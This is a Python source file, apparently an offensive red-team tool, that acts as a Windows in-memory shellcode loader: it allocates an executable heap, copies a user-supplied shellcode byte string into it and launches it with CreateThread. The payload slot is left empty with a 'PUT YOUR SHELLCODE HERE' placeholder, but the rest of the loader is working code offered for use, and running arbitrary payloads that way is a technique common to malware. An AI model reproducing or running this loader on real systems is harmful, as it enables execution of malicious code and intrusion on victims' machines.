'''
Author: @naksyn (c) 2022
-
Copyright 2022 naksyn
Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"),
to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense,
and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, 
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, 
DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE 
OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
'''

import time

import ctypes

import ctypes.wintypes as wt

kernel32 = ctypes.windll.kernel32


#### PUT YOUR SHELLCODE HERE ####

sc =  b""











def kernel32_function_definitions(sc):



    # HeapAlloc()

    HeapAlloc = ctypes.windll.kernel32.HeapAlloc

    HeapAlloc.argtypes = [wt.HANDLE, wt.DWORD, ctypes.c_size_t]

    HeapAlloc.restype = wt.LPVOID



    # HeapCreate()

    HeapCreate = ctypes.windll.kernel32.HeapCreate

    HeapCreate.argtypes = [wt.DWORD, ctypes.c_size_t, ctypes.c_size_t]

    HeapCreate.restype = wt.HANDLE



    # RtlMoveMemory()

    RtlMoveMemory = ctypes.windll.kernel32.RtlMoveMemory

    RtlMoveMemory.argtypes = [wt.LPVOID, wt.LPVOID, ctypes.c_size_t]

    RtlMoveMemory.restype = wt.LPVOID

    # CreateThread()

    CreateThread = ctypes.windll.kernel32.CreateThread

    CreateThread.argtypes = [

        wt.LPVOID, ctypes.c_size_t, wt.LPVOID,

        wt.LPVOID, wt.DWORD, wt.LPVOID

    ]

    CreateThread.restype = wt.HANDLE

    # WaitForSingleObject

    WaitForSingleObject = kernel32.WaitForSingleObject

    WaitForSingleObject.argtypes = [wt.HANDLE, wt.DWORD]

    WaitForSingleObject.restype = wt.DWORD



    

    heap = HeapCreate(0x00040000, len(sc), 0)

    HeapAlloc(heap, 0x00000008, len(sc))

    print('[*] HeapAlloc() Memory at: {:08X}'.format(heap))

    RtlMoveMemory(heap, sc, len(sc))

    print('[*] Shellcode copied into memory.')

    thread = CreateThread(0, 0, heap, 0, 0, 0)

    print('[*] CreateThread() in same process.')

    WaitForSingleObject(thread, 0xFFFFFFFF)



def main():      

    PROCESS_SOME_ACCESS = 0x000028

    MEM_COMMIT = 0x1000

    MEM_RESERVE = 0x2000

    MEM_COMMIT_RESERVE = 0x3000



    PAGE_READWRITE = 0x04

    PAGE_READWRITE_EXECUTE = 0x40

    PAGE_READ_EXECUTE = 0x20

 

    kernel32_function_definitions(sc)



if __name__ == '__main__':

    main()









